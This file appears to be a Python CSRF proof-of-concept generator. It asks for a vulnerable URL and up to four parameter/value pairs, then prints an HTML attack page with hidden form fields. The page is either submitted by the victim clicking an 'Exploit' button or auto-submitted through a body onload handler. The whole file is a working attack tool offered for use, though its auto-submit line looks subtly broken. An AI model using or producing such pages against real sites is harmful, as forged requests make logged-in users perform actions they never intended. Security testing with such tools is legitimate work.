from termcolor import colored

print(colored(''' 
      +++++ +++++ ++++++  ++++++
      +     +     +     + +
|     +     +++++ ++++++  ++++++    |
      +         + +   +   +
      +++++ +++++ +    ++ +
''','red'))

poc_name = "<center><h1><font color=red>CSRF POC BY MOONISSMILING</font></h1></center>"
no_in = '<body onload="document.createElement(\'form\').submit.call(document.getElementById(\'myForm\'))">'
#user select 1
Inp1 = input(colored('''
User Interaction[1]
Auto Interaction[2]
1 or 2 > ''','blue'))
Inp2 = input(colored('Total Parameter [1] [2] [3] [4] > ','blue'))
if Inp1=='1':
 #User Interaction Progress
 if Inp2=='1':
  #Para1
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter > ','red'))
  inp2 = input(colored('Value > ','red'))
  v1 = f"<form action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
 elif Inp2=='2':
  #Para2
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter 1 > ','red'))
  inp2 = input(colored('Value 1 > ','red'))
  inp4 = input(colored('Parameter 2 > ','red'))
  inp5 = input(colored('Value 2 > ','red'))
  v1 = f"<form action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
 elif Inp2=='3':
  #Para3
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter 1 > ','red'))
  inp2 = input(colored('Value 1 > ','red'))
  inp4 = input(colored('Parameter 2 > ','red'))
  inp5 = input(colored('Value 2 > ','red'))
  inp6 = input(colored('Parameter 3 > ','red'))
  inp7 = input(colored('Value 3 > ','red'))
  v1 = f"<form action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
  v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
 elif Inp2=='4':
  #Para3
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter 1 > ','red'))
  inp2 = input(colored('Value 1 > ','red'))
  inp4 = input(colored('Parameter 2 > ','red'))
  inp5 = input(colored('Value 2 > ','red'))
  inp6 = input(colored('Parameter 3 > ','red'))
  inp7 = input(colored('Value 3 > ','red'))
  inp8 = input(colored('Parameter 4 > ','red'))
  inp9 = input(colored('Value 4 > ','red'))
  v1 = f"<form action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
  v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
  v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
<center><input type=\'submit\' value=\'Exploit\' name=\'submit\'></center>
</form>
  ''')
elif Inp1=='2':
 #Auto Interaction Progress
 if Inp2=='1':
  #Para1
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter > ','red'))
  inp2 = input(colored('Value > ','red'))
  v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{no_in}
</form>
  ''')
 elif Inp2=='2':
  #Para2
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter 1 > ','red'))
  inp2 = input(colored('Value 1 > ','red'))
  inp4 = input(colored('Parameter 2 > ','red'))
  inp5 = input(colored('Value 2 > ','red'))
  v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{no_in}
</form>
  ''')
 elif Inp2=='3':
  #Para3
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter 1 > ','red'))
  inp2 = input(colored('Value 1 > ','red'))
  inp4 = input(colored('Parameter 2 > ','red'))
  inp5 = input(colored('Value 2 > ','red'))
  inp6 = input(colored('Parameter 3 > ','red'))
  inp7 = input(colored('Value 3 > ','red'))
  v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
  v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
{no_in}
</form>
  ''')
 elif Inp2=='4':
  #Para3
  inpu = input(colored('Vuln Url > ','red'))
  inp1 = input(colored('Parameter 1 > ','red'))
  inp2 = input(colored('Value 1 > ','red'))
  inp4 = input(colored('Parameter 2 > ','red'))
  inp5 = input(colored('Value 2 > ','red'))
  inp6 = input(colored('Parameter 3 > ','red'))
  inp7 = input(colored('Value 3 > ','red'))
  inp8 = input(colored('Parameter 4 > ','red'))
  inp9 = input(colored('Value 4 > ','red'))
  v1 = f"<form id='myForm' action='{inpu}' method='POST'>"
  v2 = f"<input type='hidden' name='{inp1}' value='{inp2}'>"
  v3 = f"<input type='hidden' name='{inp4}' value='{inp5}'>"
  v4 = f"<input type='hidden' name='{inp6}' value='{inp7}'>"
  v5 = f"<input type='hidden' name='{inp8}' value='{inp9}'>"
  print(f'''
--------------POC-------------------
{poc_name}
{v1}
{v2}
{v3}
{v4}
{v5}
{no_in}
</form>
  ''')
